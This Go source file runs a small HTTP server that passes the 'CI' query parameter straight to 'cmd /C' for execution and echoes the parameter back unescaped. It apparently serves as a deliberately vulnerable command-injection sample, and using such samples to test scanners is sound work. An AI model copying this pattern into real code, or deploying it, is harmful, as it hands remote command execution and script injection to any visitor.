package main

import (
	"io"
	"net/http"
	"os/exec"
)

func System(shell_command string) (string, error) {
	//UNIX
	//cmd := exec.Command("/bin/sh", "-c", shell_command)
	//WINDOWS
	cmd := exec.Command("cmd", "/C", shell_command)
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

func handler(w http.ResponseWriter, r *http.Request) {
	command := r.URL.Query().Get("CI")
	System(command)
	io.WriteString(w, r.URL.Query().Get("CI"))
}

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}
